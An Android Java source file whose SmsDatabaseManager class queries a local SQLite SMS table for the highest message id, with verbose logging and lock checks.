package com.vvt.sms;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.fx.maind.ref.Customization;
import com.vvt.logger.FxLog;

public class SmsDatabaseManager {
	
	private static final String TAG = "SmsDatabaseManager";
	private static final boolean LOGV = Customization.VERBOSE;
	
	public static long getLatestSmsId() {
		if (LOGV) {
			FxLog.v(TAG, "getLatestSmsId # ENTER ...");
		}
		
		SQLiteDatabase db = SmsDatabaseHelper.getReadableDatabase();
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if (LOGV) {
				FxLog.v(TAG, "getLatestSmsId # Open database FAILED!! -> EXIT ...");
			}
			if (db != null) {
				db.close();
			}
			return -1;
		}
		
		Cursor cursor = null;
		try {
			String sql = String.format("SELECT MAX(%s) FROM %s", 
					SmsDatabaseHelper.COLUMN_ID, SmsDatabaseHelper.TABLE_SMS);
			
			cursor = db.rawQuery(sql, null);
		}
		catch (SQLiteException e) {
			FxLog.e(TAG, String.format("getLatestSmsId # error: %s", e.toString()));
		}
		
		if (cursor == null || cursor.getCount() == 0) {
			if (LOGV) {
				FxLog.v(TAG, "getLatestSmsId # Query database FAILED!! -> EXIT ...");
			}
			if (cursor != null) {
				cursor.close();
			}
			db.close();
			return -1;
		}
		
		long id = -1;
		if (cursor.moveToNext()) {
			id = cursor.getLong(0);
		}
		
		cursor.close();
		db.close();
		
		if (LOGV) {
			FxLog.v(TAG, String.format("getLatestSmsId # id: %d", id));
			FxLog.v(TAG, "getLatestSmsId # EXIT ...");
		}
		return id;
	}
	
}
